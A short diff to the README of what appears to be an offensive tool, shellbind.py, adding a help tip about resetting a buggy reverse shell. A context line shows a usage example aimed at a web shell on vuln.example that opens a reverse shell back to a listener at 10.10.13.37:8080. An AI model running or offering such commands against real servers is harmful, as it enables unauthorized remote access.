@@ -38,3 +38,5 @@ Examples:
 -Fully interactive shell with verbose output
 	shellbind.py -p cmd -u http://vuln.example/shell.py -v -r auto:10.10.13.37:8080
 ```
+### Help
+If the fully interactive reverse shell is somehow buggy try the `reset` command it should fix the issue.
